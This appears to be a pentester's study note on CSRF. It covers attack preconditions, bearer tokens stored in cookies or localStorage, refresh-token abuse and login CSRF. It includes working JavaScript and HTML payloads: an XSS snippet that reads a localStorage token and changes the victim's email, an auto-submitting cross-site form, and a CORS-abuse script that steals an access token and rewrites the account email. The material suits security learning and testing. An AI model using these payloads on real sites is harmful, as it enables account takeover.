## CSRF

**Conditions Required for a CSRF Attack**  
1) User must be authenticated. - Browser will automatically send the session cookies with request.
2) Application use or relie on automatically sending credential mechanism -- like (cookies based, remember-me cookies , NTLM/Kerberos authentication)
3) Endpoint perform state changing action - Modify data ( Change password , Update email, Add user, Delete user, Transfer money , Change role , Submit form )  (post genrally, GET are read-only endpoint - no CSRF target)

**Normal cases**:  
1) [SameSite=None Cookies] If sameSite=None set then browsers will send them in cross-site requests

### Abnormal cases:
**1)** Many think JWT means CSRF not possible, but if (Bearer Token Stored in a Cookie) then CSRF still possible.
**2)** Application Accepts Multiple Authentication Methods (**Authentication header + Session Cookie**) - Sometime developer believe it protected by Auth header, but backend also accept session cookies.   
    [Always test whether removing the Authorization header still allows authenticated access via cookies.]
**3)** **CSRF + XSS** => Application uses [Authorization: Bearer token] and stored in localstorage.
   Normal CSRF not possible but if XSS exist.
   ```<script>
        fetch("/api/change-email", {
          method: "POST",
          headers: {
            Authorization: "Bearer " + localStorage.getItems("token") <---
          },
          body: JSON.stringify({
            email: "attacker@gmail.com"
          })
        });
    </script>
   ```

ask yourself:   
- Is there any XSS?  
- Can injected JavaScript run on this origin?  
- Can it read the token?   
- Can it send authenticated API requests?   
If the answer is yes, then the Authorization header protection against CSRF no longer helps because the attacker is executing code inside the trusted origin itself.

**4)** [**Refresh Token in Cookie**]  even (Auth header with bearer token) is there and token expired then refresh token present in cookies automatically send to request for new access token in this case still CSRF possible based on below senario.    
   Why CSRF Relevant here -- Because refresh token is in a cookie. Cookies are automatically sent by browser. Attacker may force: [POST /refresh-token] from another website.
       
--> suppose attacker create a page and victim visited the attacker page.
  ```
      <form action="https://bank.com/refresh-token"
          method="POST">
      </form>
      
      <script>
      document.forms[0].submit();
      </script>
  ```
browser sends
```
POST /refresh-token
Cookie: refresh_token=ABC123
```
because cookies are automatic. and attacker sucessfully trigger [POST /refresh-token]

**Senario 1** --> browser receives the (new access token) in response but (attacker cannot read it). Because browser blocks attacker.com from reading responses from bank.com.  
[ Result : Refresh happened. --> Attacker gained nothing. --> Impact = Low. ]  {it reflect only after expire}   
**Senario 2** --> Suppose access token also refresh even it then token still not expired.  mean (request -> old token expired, new one come) attacker keep refreshing request (rt1-rt2-rt3..so on) user behave strangely  
[ result : Site behave differently still the account overtake not possible ]  
**Senario 3** --> Suppose the developer made a mistake and CORS is misconfirgured then attack steal the token.  
```
// Step 1: Refresh token endpoint returns access token
// Step 2: Use access token to change email (bypassing CSRF protection)

async function attack() {
    // STEP 1: Get access token via refresh (browser sends cookie automatically)
    const refreshResponse = await fetch('https://bank.com/api/refresh', {
        method: 'POST',
        credentials: 'include',  // Sends refresh_token cookie
        headers: {
            'Content-Type': 'application/json'
        }
    });
    
    const data = await refreshResponse.json();
    const accessToken = data.access_token;  // Steal this
    
    // STEP 2: Use stolen token to change email (no CSRF token needed)
    const emailChangeResponse = await fetch('https://bank.com/api/change-email', {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${accessToken}`,  // Using stolen token
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            new_email: 'hacked@attacker.com'
        })
    });
    
    console.log('Email changed!', emailChangeResponse.status);
}

// Execute attack when victim visits malicious site
attack();
```

**5) Login CSRF** - No csrf protection at login leads to (attacker force victim to login as a attacker user)  
[Result : Not account takeover, but can cause account confusion and data leakage.]
